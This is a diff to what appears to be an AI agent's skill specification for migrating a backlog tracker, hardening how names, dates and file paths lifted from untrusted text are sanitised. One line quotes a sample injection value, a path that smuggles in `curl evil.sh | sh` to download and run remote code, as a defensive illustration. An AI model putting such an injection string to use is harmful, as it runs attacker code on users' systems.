@@ -304,8 +304,13 @@ meta `by cycle <name>`; `first_recorded` ← meta `First recorded`; `files` as a
 > construction (`done/SKILL.md:255` relies on it); this skill is the first to lift one from untrusted
 > prose, so the guarantee has to be re-established here rather than assumed.
 >
-> - **Cycle names** (`cycles[]`, `closed_by`) — apply the **P2 allowlist**, the same one Rule C
->   applies to the slug: strip every character outside `[a-z0-9-]`. This matters twice over, because a
+> - **Cycle names** (`cycles[]`, `closed_by`) — **lowercase first, then** apply the **P2 allowlist**,
+>   the same one Rule C applies to the slug: strip every character outside `[a-z0-9-]`. Lowercasing is
+>   not cosmetic. A cycle named from a Linear issue is legitimately mixed-case — `done/SKILL.md:255`
+>   documents `^[A-Za-z0-9][A-Za-z0-9-]*$` — so stripping `ENG-123-auth-bug` without lowercasing
+>   yields `-123-auth-bug`, a leading hyphen in a value that becomes both YAML and a filename
+>   fragment. Lowercase-then-strip preserves the name; strip-alone mangles it. This matters twice
+>   over, because a
 >   cycle name is not only a YAML value but becomes a **path component** on Step 7's collision branch
 >   (`debt-<slug>-<first-cycle>.md`). P2 allowlists the slug and `type` because they "compose an
 >   on-disk path"; the disambiguator composes that same path and gets the same treatment. A name that
@@ -313,6 +318,13 @@ meta `by cycle <name>`; `first_recorded` ← meta `First recorded`; `files` as a
 > - **Dates** (`first_recorded`, `closed`) — accept only `YYYY-MM-DD`. Anything else is written as
 >   the empty value and flagged `date-unparseable`; never write the model's sense of today in its
 >   place (P1's clock rule), and never write the raw text through.
+> - **`files[]` paths** — kept as written (they are the item's whole value to `dev:spec`'s
+>   cross-check), but **never built into a shell string**. Step 6 tests each one for existence and
+>   Step 9 reports them; do both by passing the path as an argument or testing it directly, never by
+>   interpolating it into a command line. A `**Files:**` value is untrusted like everything else here,
+>   and `a"; curl evil.sh | sh; echo "` is a legal thing for a hand-edited tracker to contain. Reject
+>   — do not silently rewrite — any path containing a `..` segment or a NUL, and flag it
+>   `files-rejected`.
 > - **Any lifted scalar** — a value containing a newline is truncated at the first one before it is
 >   written. An embedded newline in a front-matter scalar injects sibling keys (`scope:`,
 >   `routing: pending`, `promoted:`) into the item, which `dev:debt` and `dev:done` then act on as if
@@ -420,8 +432,9 @@ Produce `ROUTING_CTX = { dogfood: bool, target_slug: <owner/name>|null }`:
    `target_slug`, equality only. As P9 states, this comparison answers **only** "am I home?" — it is
    never used to resolve a delivery target.
 
-**Unresolvable target** (`target_slug` null, whether missing or regex-rejected) — do **not** stop. Set `dogfood: false`,
-`target_slug: null`, and record that every `scope: plugin` item will take **P9.degrade** in Step 8.
+**Unresolvable target** (`target_slug` null, whether missing or regex-rejected) — do **not** stop.
+Set `dogfood: false`, `target_slug: null`, and record that every `scope: plugin` item will take
+**P9.degrade** in Step 8.
 Say so in the table header, so the user confirms with that knowledge rather than learning it
 afterwards.
 
@@ -475,13 +488,15 @@ heuristic for the safeguard — the confirmation is the safeguard.
 
 **Closed items appear for their slug, not their scope.** Their `scope` is `repo` unconditionally
 (Step 4 rule B) and they are never routed (Success Criterion 5) — so `flip` is rejected on a closed
-row, and the header line says so. But their **slugs** are reviewed here like everyone else's, because
+row, and the in-table divider says so before anyone tries. But their **slugs** are reviewed here like
+everyone else's, because
 Rule C's whole rationale is that P2 fixes a slug as an item's *permanent* identity and this table is
 the one cheap moment to correct it. In the reference fixture 7 of 11 entries are closed; excluding
 them would leave the majority of the migration's permanent identifiers unseen by a human. Spec
 Criterion 2's slug rule says "per entry", and this is where "per entry" is honoured.
 
-Both the slug and the scope are reviewed at this single point (Success Criteria 2 and 4).
+Every slug is reviewed at this single point, and every *routable* scope with it — the one review the
+migration gets before anything is written or leaves the repo (Success Criteria 2 and 4).
 
 **The confirmation** — one prompt, accepting:
 
@@ -499,11 +514,19 @@ amended memory of it.
 already wrote (the store tree, and on a fresh-init repo the other init artifacts): the *migration* is
 abandoned cleanly, but `dev:init`'s writes are not undone. End the run here.
 
-**If the table is empty** — no parsed entries at all, because every one landed in `BUCKET_E` or the
-tracker held none — **still show it, with the header lines, and still ask.** An empty table plus
-"nothing will be migrated; the tracker will not be deleted" is an answer; skipping the prompt and
-proceeding is not. Do not treat an empty table as vacuously confirmed: this is the gate, and a gate
-that silently opens when there is nothing to show is a gate that can silently open when there is.
+**If the table is empty, still show it, with the header lines, and still ask.** Do not treat an empty
+table as vacuously confirmed: this is the gate, and a gate that silently opens when there is nothing
+to show is a gate that can silently open when there is. Two sub-cases reach it, and they get
+**different** messages, because Step 9 does different things with them:
+
+- **The tracker held no entries at all** (`FILE_HEADING_COUNT == 0`) → "Nothing to migrate. The
+  tracker is empty and **will be deleted** — an empty aggregate carries no information the store
+  needs." That is what Step 9 does with `0 == 0`, so say it here.
+- **Every entry landed in `BUCKET_E`** → "Nothing can be migrated; N entr(ies) could not be parsed,
+  and the tracker will **not** be deleted."
+
+Do not collapse these into one line. Telling a user their tracker survives and then deleting it is the
+one report this skill must never produce.
 
 **No `gh issue create` and no store write happens before this confirmation returns.** (Success
 Criterion 4.)
@@ -603,9 +626,14 @@ entry, from one of two sources:
 Then, per item carrying a `related_title`:
 
 - **Match in `SLUG_MAP`** → set `possibly_related_to: <final slug>`.
-- **No match** — the referenced entry was unparseable (`BUCKET_E`) or routed off-repo (`BUCKET_C`), so
-  no local file bears its identity → **omit the field** and flag the item `related-unresolved` for the
-  report.
+- **No match** — the referenced entry is not in the local-write set → **omit the field** and flag the
+  item `related-unresolved` for the report.
+
+  A no-match is **not** proof that no local file will ever bear that identity. The referenced entry
+  may be unparseable (`BUCKET_E`) or delivered as an issue (`BUCKET_C`), in which case no local file
+  ever exists — but it may also be an off-repo `plugin` item that **degrades** in Step 8 and lands in
+  this same store under a name nobody knows yet. Step 8 backfills those pointers once its names are
+  settled; flag it here and let Step 8 clear the flag.
 
 Never write a title into a slug field, and never point at a basename that isn't on disk.
 
@@ -655,6 +683,12 @@ Either outcome → **`BUCKET_C`**, carrying its issue number for the report.
 >    plugin repo's store (while bucket (c) counts it fully migrated and the local tracker is deleted),
 >    and lets body text open its own block with front-matter of its choosing. Same reasoning as the
 >    4-backtick outer fence the debt buffer already uses.
+>
+>    Keep the info tag exactly `markdown` whatever the fence width — that tag is what `dev:debt inbox`
+>    identifies the authoritative block by. `inbox` describes the block as three-backtick
+>    (`debt/SKILL.md:302`) because nothing had yet needed a wider one; matching on the tag rather than
+>    the delimiter width is what keeps a 4- or 5-backtick body convertible. This cycle does not modify
+>    `dev:debt` (Success Criterion 11), so note it here for whoever next touches `inbox`.
 
 **P9.degrade — on any failure** (no network, no auth, API error, or `target_slug: null` from Step 5):
 write the item into the **current** repo's `docs/backlog/` with `scope: plugin` **and**
@@ -664,12 +698,22 @@ write the item into the **current** repo's `docs/backlog/` with `scope: plugin` 
 here rather than referred back to, because this path is reached only on failure and must not depend
 on the reader having Step 7 in mind:
 
-- Before writing `debt-<slug>.md`, check that basename in **both** the active corpus **and**
-  `$STORE/closed/` — uniqueness spans the whole tree. Address every path through `$STORE` (Step 1),
-  never as a bare relative path (**NEVER-CD**).
+- Before writing `debt-<slug>.md`, check that basename against the same **three** sets Step 7 step 2
+  checks: the active corpus, `$STORE/closed/`, and **every final name already assigned in this run** —
+  which by now includes Step 7's whole local-write set *and* the degrade names assigned earlier in
+  this step. Address every path through `$STORE` (Step 1), never as a bare relative path
+  (**NEVER-CD**).
 - **Free** → write `$STORE/debt-<slug>.md`.
-- **Taken in either location** → write `$STORE/debt-<slug>-<first-cycle>.md`, where `<first-cycle>`
-  is the item's first `cycles:` entry. Record the disambiguation for the report.
+- **Taken in any of the three** → write `$STORE/debt-<slug>-<first-cycle>.md`, where `<first-cycle>`
+  is the item's first `cycles:` entry (P2-allowlisted at Step 4). If *that* name is also taken, append
+  `-2`, `-3`, … until free. Record the disambiguation for the report.
+
+The in-run set is not optional here just because this path writes fewer files. Nothing on disk shows a
+name this run has merely *decided* on: if Step 7 disambiguated an item to `debt-foo-alpha.md` and a
+degrading item's own proposed slug is `foo-alpha`, a two-set on-disk check clears both, both write the
+same path, the second wins, both are still counted in bucket (d), and the reconciliation passes —
+deleting the tracker that held the lost entry. Rule C's proposal-time dedup does not catch this
+either: it compares *proposed* slugs, and `foo-alpha` was never proposed.
 
 **Two branches Step 7 has that this path does not.** First, **no P6 recurrence-merge runs here** —
 Step 7's exclusion rule says an off-repo `plugin` item never merges into the local corpus — so a
@@ -682,6 +726,15 @@ item in the route set, so the whole degrade set is known; assign every degraded 
 the branches above; add all of them to Step 7's **`SLUG_MAP`**; *then* resolve
 `possibly_related_to` — match → `possibly_related_to: <final slug>`; no match → omit the field and
 flag `related-unresolved`.
+
+**Then backfill Step 7's deferred pointers.** Step 7 step 3 flagged `related-unresolved` on any item
+whose `related_title` it could not resolve, knowing some of those targets would turn up here. Now that
+`SLUG_MAP` is complete, re-check every item Step 7 flagged: if its `related_title` now resolves to a
+degrade name, write `possibly_related_to: <final slug>` into that already-written file and clear the
+flag. This is the only place this skill edits a file it wrote earlier in the same run, and the reason
+is the same ordering constraint that produced Rule D — a pointer must target a settled name, and a
+degrade name is not settled until delivery has been attempted. Items still unresolved after this pass
+keep the flag and reach the report honestly.
 
 Do **not** add each degrade to `SLUG_MAP` as it is written and resolve as you go. That is precisely
 what Step 7 step 3 forbids, and the consequence here is worse than untidiness: if two items X and Y
@@ -719,9 +772,15 @@ right and a store that is wrong. This is the one place in `/dev` where believing
 unrecoverable, so check it:
 
 - every `BUCKET_A` item → its step-2 final path exists on disk;
-- every `BUCKET_B` item → its matched file's `recurrence:` actually incremented;
+- every `BUCKET_B` item → its matched file carries **every** cycle name the incoming item had, and
+  `recurrence: == len(cycles)`. Check *containment*, not that the number went up: Step 7's merge
+  appends only cycle names the matched file lacks, so a legacy entry whose cycles the store already
+  records correctly appends nothing and leaves `recurrence:` where it was. That is a **successful**
+  merge, and a check for "incremented" would fail it, drop the item from bucket (b), short the sum,
+  and preserve the tracker forever across identical re-runs;
 - every `BUCKET_C` item → a non-empty issue number came back;
-- every `BUCKET_D` item → its degrade file exists on disk.
+- every `BUCKET_D` item → its degrade file exists on disk **at the name this run assigned it**, not
+  merely somewhere.
 
 Any item that fails its check is **removed from its bucket** and reported as a shortfall. It does not
 get a bucket of its own — the point is that the sum no longer reconciles, so the tracker survives.
